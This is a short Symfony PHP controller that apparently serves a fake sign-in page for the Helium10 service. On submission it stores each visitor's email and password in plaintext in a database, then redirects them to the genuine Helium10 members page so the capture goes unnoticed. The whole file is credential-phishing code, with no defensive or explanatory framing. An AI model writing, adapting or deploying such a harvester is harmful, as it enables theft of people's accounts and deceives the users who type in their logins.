<?php


namespace App\Controller;

use Doctrine\ORM\EntityManagerInterface;
use http\Client;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\RedirectResponse;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;

class HomeController extends AbstractController
{

    /**
     * @var EntityManagerInterface
     */
    private $entityManager;

    public function __construct(
        EntityManagerInterface $entityManager
    )
    {
        $this->entityManager = $entityManager;
    }

    /**
     * @Route("/", name="app_name_index", methods={"GET"})
     * @return Response
     */
    public function index(): Response
    {
        return $this->redirectToRoute('app_sign_in');
    }

    /**
     * @Route("/user/signin", name="app_sign_in", methods={"GET", "POST"})
     * @param Request $request
     * @return Response
     */
    public function sign_in(
        Request $request
    ): Response
    {
        try {
            if ($request->isMethod('POST')) {
                $data = $request->request->all();

                $client = new \App\Entity\Client();
                $client->setEmail($data['LoginForm']['email']);
                $client->setPassword($data['LoginForm']['password']);

                $this->entityManager->persist($client);
                $this->entityManager->flush();

                return new RedirectResponse('https://members.helium10.com/user-accounts?');
            }
        }
        catch (\Exception $e) {
            return $this->redirectToRoute('app_sign_in');
        }
        return $this->render('/user/sign_in.html.twig');
    }

}